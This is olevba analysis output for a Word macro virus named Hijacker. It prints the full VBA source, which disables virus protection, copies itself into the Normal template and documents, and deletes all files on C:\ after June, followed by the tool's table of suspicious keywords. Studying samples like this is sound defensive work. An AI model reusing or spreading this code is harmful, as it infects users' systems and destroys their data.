olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Hijacker
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Hijacker - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub document_open()
Options.VirusProtection = (Rnd * 0)
Options.SaveNormalPrompt = (Rnd * 0)
Set iamhere = MacroContainer.VBProject.vbcomponents(1).codemodule
If MacroContainer.FullName = NormalTemplate.FullName Then Set Infect = ActiveDocument.VBProject.vbcomponents(1).codemodule: saveit = 1
If MacroContainer.FullName = ActiveDocument.FullName Then Set Infect = NormalTemplate.VBProject.vbcomponents(1).codemodule
If Infect.countoflines < 1 Then Infect.addfromstring iamhere.lines(1, iamhere.countoflines)
If saveit = 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wddocument
If Month(Now) > 6 Then Shell ("c:\windows\command\attrib.exe c:\*.* -r -s -h"), vbHide: Kill "c:\*.*"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |attrib.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

